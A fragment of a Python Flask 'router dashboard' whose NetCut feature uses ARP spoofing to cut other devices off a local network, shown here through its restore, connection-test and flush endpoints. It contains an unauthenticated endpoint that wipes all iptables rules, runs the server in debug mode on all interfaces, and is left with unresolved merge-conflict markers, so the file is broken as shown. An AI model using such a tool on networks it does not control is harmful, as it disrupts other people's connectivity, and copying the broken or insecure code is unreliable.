            "suggestion": "Check if device is online and reachable"
        }), 500

@app.route('/api/netcut/restore', methods=['POST'])
def restore_internet_api():
    data = request.get_json()
    target_ip = data.get('target_ip')
    
    print(f"\n🌐 API REQUEST: Restore internet for {target_ip}")
    
    if target_ip:
        success = netcut.restore_internet(target_ip)
        message = f"✅ Internet RESTORED for {target_ip}"
        
        for device in devices:
            if device['ip'] == target_ip:
                device['status'] = 'up'
                device['blocked'] = False
                break
    else:
        success = netcut.restore_internet()
        message = "✅ All internet connections RESTORED"
        
        for device in devices:
            if device['ip'] in netcut.get_status()['active_cuts']:
                device['status'] = 'up'
                device['blocked'] = False
    
    if success:
        return jsonify({
            "status": "success", 
            "message": message,
            "netcut_status": netcut.get_status()
        })
    else:
        return jsonify({
            "status": "error", 
            "message": f"❌ Failed to restore internet"
        }), 500

@app.route('/api/netcut/test')
def test_netcut():
    return jsonify({
        "status": "success",
        "message": "NetCut Engine is running",
        "netcut_info": netcut.get_status()
    })

@app.route('/api/netcut/test-connection')
def test_connection_api():
    target_ip = request.args.get('ip')
    if not target_ip:
        return jsonify({"status": "error", "message": "IP parameter required"}), 400
    
    result = netcut.test_connection(target_ip)
    
    if result:
        return jsonify({
            "status": "success",
            "test_result": result,
            "is_blocked": not result['ping_response'] and result['has_iptables_rules']
        })
    else:
        return jsonify({"status": "error", "message": "Test failed"}), 500

@app.route('/api/netcut/flush-all')
def flush_all_cuts():
    """Emergency: Flush all cuts and iptables rules"""
    try:
        # Restore all NetCut targets
        netcut.restore_internet()
        
        # Flush iptables
        subprocess.run(['iptables', '-F'], capture_output=True)
        subprocess.run(['iptables', '-X'], capture_output=True)
        subprocess.run(['iptables', '-t', 'nat', '-F'], capture_output=True)
        subprocess.run(['iptables', '-t', 'nat', '-X'], capture_output=True)
        
        # Reset policies
        subprocess.run(['iptables', '-P', 'INPUT', 'ACCEPT'], capture_output=True)
        subprocess.run(['iptables', '-P', 'FORWARD', 'ACCEPT'], capture_output=True)
        subprocess.run(['iptables', '-P', 'OUTPUT', 'ACCEPT'], capture_output=True)
        
        # Enable IP forwarding
        with open('/proc/sys/net/ipv4/ip_forward', 'w') as f:
            f.write('1')
        
        # Reset all device statuses
        for device in devices:
            device['status'] = 'up'
            device['blocked'] = False
        
        print("⚠️  EMERGENCY FLUSH: All cuts removed, iptables cleared")
        
        return jsonify({
            "status": "success",
            "message": "All cuts flushed, iptables cleared, network restored",
            "warning": "This was an emergency reset!"
        })
    except Exception as e:
        return jsonify({"status": "error", "message": f"Flush failed: {e}"}), 500

# ==================== MAIN ====================

>>>>>>> e1b2da4 (upgrade with cut inprogram)
if __name__ == '__main__':
    # Check if running with sudo
    if os.geteuid() != 0:
        print("\n" + "!"*60)
        print("⚠️  WARNING: Running without ROOT privileges!")
        print("⚠️  NetCut ARP spoofing requires SUDO permissions")
        print("⚠️  Run with: sudo python3 app.py")
        print("!"*60)
        print("   Some features may not work properly")
        print("   You can continue, but NetCut may fail")
        print("!"*60)
        
        response = input("\nContinue anyway? (y/N): ")
        if response.lower() != 'y':
            print("Exiting...")
            sys.exit(1)
    
    hostname = get_local_hostname()
    print(f"\n🏠 Starting application on host: {hostname}")
    
<<<<<<< HEAD
=======
    # Load saved device names
    saved_devices = load_saved_device_names()
    
>>>>>>> e1b2da4 (upgrade with cut inprogram)
    # Initial scan
    scan_network()
    get_network_stats()
    
    # Start the background task
    initialize()
    
    # Run Flask app
<<<<<<< HEAD
    app.run(host='0.0.0.0', port=5000, debug=True)
=======
    print("\n" + "="*60)
    print("🚀 ROUTER DASHBOARD with NETCUT ARP SPOOFING")
    print("="*60)
    print(f"🌐 Dashboard: http://localhost:8686")
    print(f"🌐 Dashboard (Network): http://{get_local_network_info()['local_ip']}:8686")
    print(f"🔧 NetCut Status: http://localhost:8686/api/netcut/status")
    print(f"🔪 Test Connection: http://localhost:8686/api/netcut/test-connection?ip=<target_ip>")
    print(f"🔄 Flush All: http://localhost:8686/api/netcut/flush-all")
    print("="*60)
    print("⚠️  IMPORTANT: NetCut works best when run with SUDO")
    print("="*60 + "\n")
    
    try:
        app.run(host='0.0.0.0', port=8686, debug=True, threaded=True)
    except KeyboardInterrupt:
        print("\n👋 Shutting down NetCut Engine...")
        netcut.cleanup()
        print("Goodbye!")
# [file content end]
>>>>>>> e1b2da4 (upgrade with cut inprogram)
